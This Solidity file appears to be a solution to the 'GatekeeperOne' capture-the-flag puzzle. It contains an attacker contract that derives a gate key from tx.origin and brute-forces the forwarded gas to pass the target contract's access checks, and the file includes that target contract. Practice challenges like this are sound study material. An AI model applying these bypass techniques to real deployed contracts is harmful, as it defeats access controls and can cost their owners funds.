// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract TheOtherMe {
    GatekeeperOne gatekeeperOne;

    constructor(address _address) {
        gatekeeperOne = GatekeeperOne(_address);
    }

    function callEnter() external returns (bool) {
        uint16 tmpKey = uint16(uint160(tx.origin));
        uint64 key = tmpKey + 8589934592; // 2^33

        for (uint i = 0; i < 8191; i++) {
            try gatekeeperOne.enter{gas: 30000 + i}(bytes8(key)) returns (
                bool succ
            ) {
                if (succ) {
                    return succ;
                }
            } catch {}
        }
        return false;
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
